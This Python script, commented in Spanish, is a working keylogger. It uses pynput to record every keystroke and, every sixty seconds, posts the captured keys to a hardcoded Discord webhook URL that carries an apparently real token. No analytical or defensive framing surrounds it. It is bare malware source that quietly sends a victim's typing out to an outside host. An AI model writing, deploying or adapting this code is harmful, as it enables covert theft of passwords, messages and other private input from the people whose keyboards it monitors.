from pynput import keyboard
import requests
import time

# Configura el webhook de Discord
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1196971918759313598/yIrrXm509i0oQ2jxCYal9Gmd1Yk3xXPVnWkWiA3Qllf6NXEoO2OpO6U-3pC003bRArBN"

# Lista para almacenar las pulsaciones
key_events = []

# Función para enviar los datos al webhook
def send_to_discord(data):
    payload = {"content": data}
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

# Función para manejar las pulsaciones de teclas
def on_press(key):
    try:
        # Añade la pulsación a la lista
        key_events.append(key.char)
    except AttributeError:
        # Maneja las teclas especiales
        key_events.append(str(key))

# Función principal para detectar pulsaciones y enviar cada 60 segundos
def main():
    global key_events
    try:
        # Configura el escucha de teclado
        with keyboard.Listener(on_press=on_press) as listener:
            while True:
                # Espera 60 segundos
                time.sleep(60)

                # Convierte la lista de pulsaciones a una cadena
                key_data = ', '.join(key_events)

                # Reinicia la lista de pulsaciones para el próximo intervalo
                key_events = []

                # Envía los datos al webhook de Discord
                send_to_discord(f"Pulsaciones en los últimos 60 segundos:\n{key_data}")

    except KeyboardInterrupt:
        # Maneja la interrupción del teclado y envía las pulsaciones capturadas
        send_to_discord(f"Pulsaciones en los últimos 60 segundos:\n{key_data}")

if __name__ == "__main__":
    main()
